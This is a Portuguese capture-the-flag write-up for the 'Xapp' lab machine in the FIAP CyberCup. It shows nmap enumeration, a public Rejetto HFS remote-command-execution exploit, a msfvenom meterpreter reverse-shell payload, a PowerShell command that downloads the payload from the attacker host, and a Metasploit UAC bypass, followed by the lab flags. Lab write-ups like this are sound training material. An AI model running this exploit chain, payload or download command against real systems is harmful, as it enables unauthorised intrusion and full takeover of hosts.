---
title: Xapp
category: FIAP CyberCup
---

## Enumeração

- Executado nmap e enumerados os seguintes serviços

```plaintext
zurc@kali:/dcruz/fiap/cybercup/xapp/scan$ nmap -A -p21,80,135,139,443,445,3306,5357,5358,49152-49157 -Pn -oA full 10.
2.0.133                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-28 02:12 -03
Nmap scan report for 10.2.0.133                           
Host is up (0.0010s latency).       
                                                          
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd 0.9.41 beta
| ftp-syst:                                                                                                         
|_  SYST: UNIX emulated by FileZilla                                                                                
80/tcp    open  http         Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.31)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.31
| http-title: Welcome to XAMPP                                                                                      
|_Requested resource was http://10.2.0.133/dashboard/                                                               
|_https-redirect: ERROR: Script execution failed (use -d to debug)                                                                                                                                                                         
135/tcp   open  msrpc        Microsoft Windows RPC                                                                  
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                                                                                                                                 
443/tcp   open  ssl/http     Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.31)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.31
| http-title: Welcome to XAMPP           
|_Requested resource was https://10.2.0.133/dashboard/
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47           
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:                                                                                                         
|_  http/1.1          
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings:                                                                                              
|   NULL:                                                                                                           
|_    Host '10.2.0.129' is not allowed to connect to this MariaDB server
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0          
|_http-title: Service Unavailable
5358/tcp  open  http         HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3                     
|_http-title: HFS /                                       
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC                                                                  
49157/tcp open  msrpc        Microsoft Windows RPC      
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=6/28%Time=5EF826D0%P=x86_64-pc-linux-gnu%r(NU                                                                                                                                                                 
SF:LL,49,"E\0\0\x01\xffj\x04Host\x20'10\.2\.0\.129'\x20is\x20not\x20allowe                                                                                                                                                                 
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");                                                                                                                                                                                
Service Info: Host: PWK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:                                                                                                
|_clock-skew: mean: 1h00m00s, deviation: 1h43m55s, median: 0s                                                                                                                                                                              
|_nbstat: NetBIOS name: PWK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:35:f3:38 (VMware)
| smb-os-discovery:                                                                                                 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: PWK-PC                                 
|   NetBIOS computer name: PWK-PC\x00
|   Workgroup: WORKGROUP\x00                              
|_  System time: 2020-06-28T02:13:47-03:00
| smb-security-mode:                                      
|   account_used: guest                                   
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:                                     
|   2.02:                                                 
|_    Message signing enabled but not required
| smb2-time:                                              
|   date: 2020-06-28T05:13:49
|_  start_date: 2020-06-28T05:01:48

Service detection performed. Please report any incorrect results at https://nma
```

- Aps identificar que possui o serviço HFS em execução, validado que existe uma versão vulneravel conforme searchsploit

```plaintext
zurc@kali:/dcruz/fiap/cybercup/alice$ searchsploit hfs
----------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service                  | osx/dos/29454.txt
Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service)                            | osx/dos/12375.c
Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure                        | osx/local/35488.c
Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation                 | osx/local/8266.txt
FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution                         | windows/remote/37985.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                        | multiple/remote/48569.py
Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service                        | linux/dos/28895.txt
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)             | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                  | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                     | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution           | windows/webapps/34852.txt
----------------------------------------------------------------------------------- ---------------------------------

```

- Utilizado exploit **Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)** onde foi obtido um shell reverso, onde o arquivo nc.exe era baixado de um wget.vbs criado no momento de execução

```bash
python ./39161.py 10.2.0.133 5358
```

- Após execução, foi possível obter a flag do user.txt

```bash
C:\Users\Public>type user.txt
type user.txt
3jdi94lsnc94nznuec7usah237yd73
```

## Escalação

- Durante enumeração validado que user pwk possui acesso administrativo porem nao possuia os privilégios necessários.

```bash
net localgroup administradores
```

- Criado payload meterpreter via msfvenom, transferido para a maquina posteriormente utilizando powershell

```plaintext
-rw-r--r-- 1 zurc zurc   7168 Jun 28 02:58 shell.exe
zurc@kali:/dcruz/fiap/cybercup/xapp/exploit$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.2.0.129 LPORT=4444 -f exe -o shell.exe -e x64/xor -i 5
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x64/xor
x64/xor succeeded with size 551 (iteration=0)
x64/xor succeeded with size 591 (iteration=1)
x64/xor succeeded with size 631 (iteration=2)
x64/xor succeeded with size 671 (iteration=3)
x64/xor succeeded with size 711 (iteration=4)
x64/xor chosen with final size 711
Payload size: 711 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://10.2.0.129/shell.exe','C:\users\public\shell.exe')
```

- No meterpreter, carregado modulo **windows/local/bypassuac**

```plaintext
msf5 exploit(windows/local/bypassuac) > run            
                                                          
[*] Started reverse TCP handler on 10.2.0.129:4444                                                                   
[*] UAC is Enabled, checking level...                     
[+] UAC is set to Default                                 
[+] BypassUAC can bypass this setting, continuing...      
[+] Part of Administrators group! Continuing...           
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...                                                         
[*] Meterpreter stager executable 7168 bytes long being uploaded..
[*] Sending stage (201283 bytes) to 10.2.0.133         
[*] Meterpreter session 4 opened (10.2.0.129:4444 -> 10.2.0.133:49498) at 2020-06-28 03:19:19 -0300                  
                                                          
meterpreter > shell
```

- Neste novo shell, validado que permissões estavam ok com **getpriv**  e depois obtido flag root.txt através do shell

```plaintext
C:\Users\PWK>type root.txt                   
type root.txt                                             
jsuenac8274ncalbfdsf487fasuchac  
```
